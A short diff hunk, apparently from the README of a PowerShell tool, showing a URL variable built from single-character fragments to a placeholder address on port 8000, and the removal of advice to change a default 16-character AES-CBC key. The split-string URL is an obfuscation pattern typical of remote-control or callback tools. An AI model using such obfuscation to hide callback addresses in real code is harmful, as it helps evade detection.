@@ -10,7 +10,4 @@
 
 `$U='h'+ 't'+ 't'+ 'p'+':'+ '/'+'/'+ '0'+ '0'+'0'+'.'+'0'+ '0'+'0'+'.'+'0'+'0'+'0'+'.'+'0'+ '0'+ '0'+':'+ '8'+'0'+'0'+ '0'`
 
-
-To enhance security, it is recommended to replace the default encryption key "abcdefghijklmnop" with a custom key of your choice. Keep in mind that the key must be exactly 16 characters long to work with the AES encryption in CBC mode. 
-
 by:@ rick porto
